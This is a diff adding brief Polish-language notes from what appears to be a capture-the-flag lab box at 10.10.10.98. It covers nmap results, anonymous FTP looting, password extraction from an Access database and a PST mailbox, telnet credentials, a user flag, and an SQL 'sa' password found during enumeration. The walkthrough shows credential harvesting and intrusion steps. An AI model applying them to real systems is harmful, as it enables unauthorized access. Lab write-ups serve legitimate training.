@@ -1,0 +1,84 @@
+NMAP
+
+Nmap: Nmap scan report for 10.10.10.98
+[*] Nmap: Host is up (0.039s latency).
+[*] Nmap: Not shown: 65532 filtered ports
+[*] Nmap: PORT   STATE SERVICE VERSION
+[*] Nmap: 21/tcp open  ftp     Microsoft ftpd
+[*] Nmap: | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+[*] Nmap: |_Can't get directory listing: TIMEOUT
+[*] Nmap: | ftp-syst:
+[*] Nmap: |_  SYST: Windows_NT
+[*] Nmap: 23/tcp open  telnet?
+[*] Nmap: 80/tcp open  http    Microsoft IIS httpd 7.5
+[*] Nmap: | http-methods:
+[*] Nmap: |   Supported Methods: OPTIONS TRACE GET HEAD POST
+[*] Nmap: |_  Potentially risky methods: TRACE
+[*] Nmap: |_http-server-header: Microsoft-IIS/7.5
+[*] Nmap: |_http-title: MegaCorp
+____________________________________________________________________________
+FPT >> anonimowe logowanie
+
+Pliki 'Access Control.zip' + backup.mdb
+.zip -> potrzebne hasło
+____________________________________________________________________________
+$string backup.mdb > test
+--> "access4u@security" --> hasło do 'Access Control.zip"
+____________________________________________________________________________
+'Access Control.zip'
+|
+|_______\ 'Access Control.pst'
+        /
+____________________________________________________________________________
+$readpst ac.pst
+|_____\
+      /ac.mbox
+
+ac.mbox= "... The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers. ..."
+____________________________________________________________________________
+telnet creds:
+security:4Cc3ssC0ntr0ller
+____________________________________________________________________________
+C:\Users\security\Desktop>more user.txt
+ff1f3b48913b213a31ff6756d2553d38
+____________________________________________________________________________
+    ENUMERATING
+____________________________________________________________________________
+    C:\temp
+____________________________________________________________________________
+C:\temp\scripts>more README_FIRST.txt
+"...
+- When it opens the "Connect to Server" dialog, under "Server name:" type "LOCALHOST", "Authentication:" selected must be "SQL Server Authentication".
+ 
+   "Login:" = "sa"
+   "Password:" = "htrcy@HXeryNJCTRHcnb45CJRY"
+
+..."
+___________________________________________________________________________
+    C:\inetpub
+___________________________________________________________________________
+C:\inetpub\wwwroot>cd aspnet_client
+Access is denied.
+
+---
+C:\inetpub>cd history
+Access is denied.
+
+---
+C:\inetpub>cd logs
+Access is denied.
+
+---
+C:\inetpub\temp>cd appPools
+Access is denied.
+
+---
+C:\inetpub\temp>cd "IIS Temporary Compressed Files"
+Access is denied.
+___________________________________________________________________________
+    C:/Users/security/.yawncam/2/extravars
+    !!! MOŻLIWOŚĆ MODYFIKACJI TEMPERATURY - Z TEJ WARTOŚCI MOŻE KORZYSTAĆ JAKIŚ SKRYPT!!
+
+___________________________________________________________________________
+
+
